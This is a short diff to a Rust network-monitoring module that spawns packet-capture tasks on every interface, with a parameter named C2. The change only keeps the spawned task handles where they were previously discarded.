@@ -30,12 +30,17 @@ pub mod net_mon {
     pub async fn init(c2: Option<Arc<Mutex<C2>>>) -> Modules {
         let (tx, mut rx) = channel(10);
 
+        let mut handles = Vec::new();
         for interface in datalink::interfaces() {
             info!("Capturing interface: {}", interface.name);
 
             let tx = tx.clone();
-            tokio::spawn(async move { capture_packets(&interface, tx).await });
+            let handle = tokio::spawn(async move {
+                capture_packets(&interface, tx).await
+            });
+            handles.push(handle);
         }
+
 
         let mut counter = 0;
         let mut ud = 0;
